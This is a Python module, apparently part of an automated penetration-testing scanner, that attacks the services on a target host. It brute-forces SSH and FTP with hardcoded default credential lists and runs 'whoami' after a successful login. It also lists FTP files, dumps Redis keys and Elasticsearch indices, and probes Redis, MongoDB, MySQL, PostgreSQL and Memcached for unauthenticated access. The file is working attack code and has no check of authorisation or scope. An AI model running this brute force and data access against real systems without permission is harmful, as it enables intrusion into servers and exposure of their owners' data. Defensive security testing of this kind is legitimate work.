"""
Service Attack Module — Active brute force and service exploitation.

Tries to actually break into services like a real attacker:
- SSH brute force (common creds)
- FTP brute force
- Redis/MongoDB/MySQL unauthenticated access
- SMTP relay testing
- Default credentials for known services
"""
import asyncio
import logging
import socket
from typing import Optional

logger = logging.getLogger(__name__)

# Common credential pairs for brute force
SSH_CREDS = [
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "123456"),
    ("root", "admin"), ("root", "changeme"), ("root", "qwerty"), ("root", "letmein"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("admin", "changeme"),
    ("ubuntu", "ubuntu"), ("deploy", "deploy"), ("user", "user"), ("test", "test"),
    ("postgres", "postgres"), ("mysql", "mysql"), ("www-data", "www-data"),
    ("pi", "raspberry"), ("vagrant", "vagrant"), ("ansible", "ansible"),
    ("git", "git"), ("jenkins", "jenkins"), ("docker", "docker"),
]

FTP_CREDS = [
    ("anonymous", ""), ("anonymous", "anonymous@"), ("ftp", "ftp"),
    ("admin", "admin"), ("admin", "password"), ("root", "root"),
    ("user", "user"), ("test", "test"),
]

REDIS_COMMANDS = [
    "INFO", "CONFIG GET *", "KEYS *", "CLIENT LIST",
]

MYSQL_CREDS = [
    ("root", ""), ("root", "root"), ("root", "password"), ("root", "mysql"),
    ("admin", "admin"), ("mysql", "mysql"),
]


class ServiceAttackModule:
    """Actively attempts to exploit discovered services."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def run(self, context: dict) -> list[dict]:
        """Attack all discovered services based on port scan results."""
        findings = []
        ports = context.get("ports", {})
        domain = context.get("domain", "")
        base_url = context.get("base_url", "")

        # Resolve domain to IP for service connections
        ip = await self._resolve_ip(domain)
        if not ip:
            logger.warning(f"Cannot resolve {domain} — skipping service attacks")
            return findings

        # Decide what to attack based on discovered ports
        tasks = []

        for host, port_list in ports.items():
            if isinstance(port_list, list):
                for port_info in port_list:
                    port = port_info.get("port") if isinstance(port_info, dict) else port_info
                    service = port_info.get("service", "") if isinstance(port_info, dict) else ""
                    tasks.append(self._attack_port(ip, int(port), service, domain))
            elif isinstance(port_list, dict):
                for port, info in port_list.items():
                    service = info.get("service", "") if isinstance(info, dict) else str(info)
                    tasks.append(self._attack_port(ip, int(port), service, domain))

        # Also try common ports even if not discovered (nmap may have missed them)
        common_ports = [
            (22, "ssh"), (21, "ftp"), (3306, "mysql"), (5432, "postgresql"),
            (6379, "redis"), (27017, "mongodb"), (11211, "memcached"),
            (9200, "elasticsearch"), (5601, "kibana"), (8080, "http-alt"),
            (8443, "https-alt"), (2222, "ssh-alt"), (3389, "rdp"),
        ]
        existing_ports = set()
        for host, port_list in ports.items():
            if isinstance(port_list, list):
                for pi in port_list:
                    existing_ports.add(int(pi.get("port") if isinstance(pi, dict) else pi))
            elif isinstance(port_list, dict):
                for p in port_list:
                    existing_ports.add(int(p))

        for port, service in common_ports:
            if port not in existing_ports:
                tasks.append(self._attack_port(ip, port, service, domain))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)

        return findings

    async def _resolve_ip(self, domain: str) -> Optional[str]:
        """Resolve domain to IP address."""
        # Strip port if present
        host = domain.split(":")[0]
        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, socket.gethostbyname, host)
            return result
        except Exception:
            return None

    async def _attack_port(self, ip: str, port: int, service: str, domain: str) -> list[dict]:
        """Attack a specific port based on the service type."""
        findings = []
        service_lower = service.lower()

        # First check if port is actually open
        if not await self._is_port_open(ip, port):
            return []

        logger.info(f"Port {port} open on {ip} — attacking ({service or 'unknown'})")

        if port == 22 or "ssh" in service_lower:
            findings.extend(await self._attack_ssh(ip, port, domain))
        elif port == 21 or "ftp" in service_lower:
            findings.extend(await self._attack_ftp(ip, port, domain))
        elif port == 6379 or "redis" in service_lower:
            findings.extend(await self._attack_redis(ip, port, domain))
        elif port == 27017 or "mongo" in service_lower:
            findings.extend(await self._attack_mongodb(ip, port, domain))
        elif port == 3306 or "mysql" in service_lower:
            findings.extend(await self._attack_mysql(ip, port, domain))
        elif port == 5432 or "postgres" in service_lower:
            findings.extend(await self._attack_postgres(ip, port, domain))
        elif port == 11211 or "memcached" in service_lower:
            findings.extend(await self._attack_memcached(ip, port, domain))
        elif port == 9200 or "elastic" in service_lower:
            findings.extend(await self._attack_elasticsearch(ip, port, domain))

        return findings

    async def _is_port_open(self, ip: str, port: int, timeout: float = 3.0) -> bool:
        """Quick TCP connect check."""
        try:
            loop = asyncio.get_event_loop()
            fut = loop.run_in_executor(None, self._tcp_connect, ip, port, timeout)
            return await asyncio.wait_for(fut, timeout=timeout + 1)
        except Exception:
            return False

    @staticmethod
    def _tcp_connect(ip: str, port: int, timeout: float) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            s.close()
            return True
        except Exception:
            return False

    async def _attack_ssh(self, ip: str, port: int, domain: str) -> list[dict]:
        """Brute force SSH with common credentials."""
        findings = []
        try:
            import asyncssh
        except ImportError:
            # Fallback: try paramiko
            try:
                import paramiko
                return await self._attack_ssh_paramiko(ip, port, domain)
            except ImportError:
                logger.debug("No SSH library available (asyncssh/paramiko)")
                return []

        for username, password in SSH_CREDS[:15]:  # Limit attempts
            async with self.rate_limit:
                try:
                    conn = await asyncio.wait_for(
                        asyncssh.connect(ip, port=port, username=username, password=password,
                                         known_hosts=None),
                        timeout=8.0,
                    )
                    # SUCCESS — SSH login worked!
                    result = await conn.run("whoami", check=False)
                    whoami = result.stdout.strip() if result.stdout else username
                    conn.close()

                    findings.append({
                        "title": f"SSH Brute Force Success: {username}@{domain}:{port}",
                        "url": f"ssh://{domain}:{port}",
                        "severity": "critical",
                        "vuln_type": "auth_bypass",
                        "payload": f"ssh {username}@{domain} -p {port} (password: {password})",
                        "param": f"username={username}",
                        "impact": f"SSH login successful as '{whoami}'. Full server access compromised.",
                        "remediation": "Change SSH password immediately. Disable password auth, use key-based auth. "
                                      "Add fail2ban. Restrict SSH access via firewall.",
                        "method": "CONNECT",
                        "response_preview": f"whoami: {whoami}",
                    })
                    logger.warning(f"SSH BRUTE FORCE SUCCESS: {username}@{ip}:{port}")
                    return findings  # One success is enough

                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue  # Auth failed, try next

        return findings

    async def _attack_ssh_paramiko(self, ip: str, port: int, domain: str) -> list[dict]:
        """Fallback SSH brute force using paramiko."""
        import paramiko
        findings = []

        for username, password in SSH_CREDS[:15]:
            async with self.rate_limit:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                    loop = asyncio.get_event_loop()
                    await asyncio.wait_for(
                        loop.run_in_executor(None, lambda: client.connect(
                            ip, port=port, username=username, password=password, timeout=8,
                            allow_agent=False, look_for_keys=False)),
                        timeout=10.0,
                    )
                    # SUCCESS
                    stdin, stdout, stderr = client.exec_command("whoami")
                    whoami = stdout.read().decode().strip()
                    client.close()

                    findings.append({
                        "title": f"SSH Brute Force Success: {username}@{domain}:{port}",
                        "url": f"ssh://{domain}:{port}",
                        "severity": "critical",
                        "vuln_type": "auth_bypass",
                        "payload": f"ssh {username}@{domain} -p {port} (password: {password})",
                        "param": f"username={username}",
                        "impact": f"SSH login successful as '{whoami}'. Full server access.",
                        "remediation": "Change SSH password. Disable password auth. Use key-based auth. Add fail2ban.",
                        "method": "CONNECT",
                        "response_preview": f"whoami: {whoami}",
                    })
                    return findings
                except Exception:
                    continue

        return findings

    async def _attack_ftp(self, ip: str, port: int, domain: str) -> list[dict]:
        """Brute force FTP with common creds + test anonymous access."""
        import ftplib
        findings = []

        for username, password in FTP_CREDS:
            async with self.rate_limit:
                try:
                    loop = asyncio.get_event_loop()

                    def _try_ftp():
                        ftp = ftplib.FTP()
                        ftp.connect(ip, port, timeout=8)
                        ftp.login(username, password)
                        files = ftp.nlst()
                        ftp.quit()
                        return files

                    files = await asyncio.wait_for(loop.run_in_executor(None, _try_ftp), timeout=10)

                    findings.append({
                        "title": f"FTP Login Success: {username}@{domain}:{port}",
                        "url": f"ftp://{domain}:{port}",
                        "severity": "critical" if username != "anonymous" else "high",
                        "vuln_type": "auth_bypass",
                        "payload": f"ftp {username}@{domain}:{port} (password: {password or '<empty>'})",
                        "impact": f"FTP access as '{username}'. Files visible: {files[:10]}",
                        "remediation": "Disable anonymous FTP. Use SFTP. Require strong passwords.",
                        "method": "CONNECT",
                        "response_preview": f"Files: {files[:10]}",
                    })
                    return findings
                except Exception:
                    continue

        return findings

    async def _attack_redis(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test for unauthenticated Redis access."""
        findings = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5.0
            )

            # Try INFO command (no auth)
            writer.write(b"INFO\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            response = data.decode("utf-8", errors="ignore")

            if "redis_version" in response:
                # Extract version
                version = ""
                for line in response.split("\r\n"):
                    if line.startswith("redis_version:"):
                        version = line.split(":")[1]
                        break

                # Try to get keys
                writer.write(b"KEYS *\r\n")
                await writer.drain()
                keys_data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
                keys_response = keys_data.decode("utf-8", errors="ignore")

                findings.append({
                    "title": f"Redis Unauthenticated Access on {domain}:{port}",
                    "url": f"redis://{domain}:{port}",
                    "severity": "critical",
                    "vuln_type": "auth_bypass",
                    "payload": f"redis-cli -h {domain} -p {port} INFO",
                    "impact": f"Redis {version} accessible without authentication. "
                             f"Attacker can read/write all data, execute Lua scripts, "
                             f"or write SSH keys for server takeover.",
                    "remediation": "Set requirepass in redis.conf. Bind to 127.0.0.1. Use firewall.",
                    "method": "CONNECT",
                    "response_preview": f"Redis {version}. Keys: {keys_response[:200]}",
                })

            writer.close()
        except Exception as e:
            logger.debug(f"Redis attack on {ip}:{port} failed: {e}")

        return findings

    async def _attack_mongodb(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test for unauthenticated MongoDB access."""
        findings = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5.0
            )

            # MongoDB wire protocol: send isMaster command
            # Simplified: just check if port responds like MongoDB
            writer.write(b"\x41\x00\x00\x00")  # Minimal message
            await writer.drain()
            data = await asyncio.wait_for(reader.read(1024), timeout=5.0)

            if len(data) > 10:
                findings.append({
                    "title": f"MongoDB Potentially Unauthenticated on {domain}:{port}",
                    "url": f"mongodb://{domain}:{port}",
                    "severity": "high",
                    "vuln_type": "auth_bypass",
                    "payload": f"mongosh {domain}:{port}",
                    "impact": "MongoDB port is open and responding. Test with mongosh for auth bypass.",
                    "remediation": "Enable authentication. Bind to 127.0.0.1. Use firewall.",
                    "method": "CONNECT",
                })

            writer.close()
        except Exception:
            pass

        return findings

    async def _attack_mysql(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test MySQL with common credentials."""
        findings = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5.0
            )
            # Read MySQL greeting
            data = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            if b"mysql" in data.lower() or len(data) > 40:
                # MySQL is responding
                version = ""
                try:
                    # Parse greeting packet for version
                    payload = data[4:]  # Skip length + seq
                    null_pos = payload.find(b"\x00")
                    if null_pos > 0:
                        version = payload[:null_pos].decode("utf-8", errors="ignore")
                except Exception:
                    pass

                findings.append({
                    "title": f"MySQL Exposed on {domain}:{port}" + (f" (v{version})" if version else ""),
                    "url": f"mysql://{domain}:{port}",
                    "severity": "medium",
                    "vuln_type": "info_disclosure",
                    "payload": f"mysql -h {domain} -P {port} -u root",
                    "impact": f"MySQL port {port} is publicly accessible. Version: {version or 'unknown'}. "
                             "Try default credentials.",
                    "remediation": "Bind MySQL to 127.0.0.1. Use firewall. Disable remote root login.",
                    "method": "CONNECT",
                })

            writer.close()
        except Exception:
            pass

        return findings

    async def _attack_postgres(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test PostgreSQL exposure."""
        findings = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5.0
            )
            # Send startup message
            # V3 protocol: int32 length, int32 protocol(196608=3.0), params...
            import struct
            startup = struct.pack("!II", 8, 196608)
            writer.write(startup)
            await writer.drain()
            data = await asyncio.wait_for(reader.read(1024), timeout=5.0)

            if data and (data[0:1] == b"R" or data[0:1] == b"E"):
                findings.append({
                    "title": f"PostgreSQL Exposed on {domain}:{port}",
                    "url": f"postgresql://{domain}:{port}",
                    "severity": "medium",
                    "vuln_type": "info_disclosure",
                    "payload": f"psql -h {domain} -p {port} -U postgres",
                    "impact": "PostgreSQL is publicly accessible. Try default credentials.",
                    "remediation": "Restrict pg_hba.conf. Bind to 127.0.0.1. Use firewall.",
                    "method": "CONNECT",
                })

            writer.close()
        except Exception:
            pass

        return findings

    async def _attack_memcached(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test Memcached unauthenticated access."""
        findings = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5.0
            )
            writer.write(b"stats\r\n")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            response = data.decode("utf-8", errors="ignore")

            if "STAT" in response:
                findings.append({
                    "title": f"Memcached Unauthenticated on {domain}:{port}",
                    "url": f"memcached://{domain}:{port}",
                    "severity": "high",
                    "vuln_type": "auth_bypass",
                    "payload": f"echo 'stats' | nc {domain} {port}",
                    "impact": "Memcached accessible without auth. Can read cached data, perform DDoS amplification.",
                    "remediation": "Bind to 127.0.0.1. Use SASL authentication. Firewall.",
                    "method": "CONNECT",
                    "response_preview": response[:300],
                })

            writer.close()
        except Exception:
            pass

        return findings

    async def _attack_elasticsearch(self, ip: str, port: int, domain: str) -> list[dict]:
        """Test Elasticsearch unauthenticated access."""
        findings = []
        import httpx

        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                # Try cluster info
                resp = await client.get(f"http://{ip}:{port}/")
                if resp.status_code == 200 and "cluster_name" in resp.text:
                    data = resp.json()
                    version = data.get("version", {}).get("number", "unknown")
                    cluster = data.get("cluster_name", "unknown")

                    # Try to list indices
                    idx_resp = await client.get(f"http://{ip}:{port}/_cat/indices")
                    indices = idx_resp.text[:500] if idx_resp.status_code == 200 else "N/A"

                    findings.append({
                        "title": f"Elasticsearch Unauthenticated on {domain}:{port} (v{version})",
                        "url": f"http://{domain}:{port}",
                        "severity": "critical",
                        "vuln_type": "auth_bypass",
                        "payload": f"curl http://{domain}:{port}/_cat/indices",
                        "impact": f"Elasticsearch {version} (cluster: {cluster}) is publicly accessible "
                                 f"without auth. All data can be read, modified, or deleted.",
                        "remediation": "Enable X-Pack Security. Use authentication. Bind to 127.0.0.1.",
                        "method": "GET",
                        "response_preview": f"Indices: {indices}",
                    })
        except Exception:
            pass

        return findings
